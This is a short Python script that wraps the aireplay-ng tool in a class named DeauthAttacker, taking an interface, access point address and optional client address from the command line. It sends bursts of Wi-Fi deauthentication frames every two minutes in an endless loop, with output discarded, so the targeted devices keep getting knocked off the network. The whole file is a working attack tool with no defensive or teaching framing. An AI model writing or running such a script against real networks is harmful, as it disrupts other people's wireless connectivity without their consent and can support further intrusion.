import subprocess
import time
import os

import sys
import argparse

class DeauthAttacker(object):
    def __init__(self, iface, ap, client=None):
        self._sleep_time = 120
        self._run = True
        self._cmd = ["/usr/sbin/aireplay-ng", "--ignore-negative-one",
                     "--deauth", "5",
                     "-a", str(ap)]

        if client:
            self._cmd.append("-c")
            self._cmd.append(str(client))

        self._cmd.append(iface)

    def start(self):
        while self._run:
            subprocess.Popen(self._cmd, stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT, shell=False)
            time.sleep(self._sleep_time)



def main(args):
    parser = argparse.ArgumentParser()
    parser.add_argument("iface")
    parser.add_argument("ap", type=str)
    parser.add_argument("--sta", type=str)
    parsed = parser.parse_args(args[1:])

    if parsed.sta:
        d = DeauthAttacker(parsed.iface, parsed.ap, client=parsed.sta)
    else:
        d = DeauthAttacker(parsed.iface, parsed.ap)

    d.start()

if __name__ == "__main__":
    sys.exit(main(sys.argv))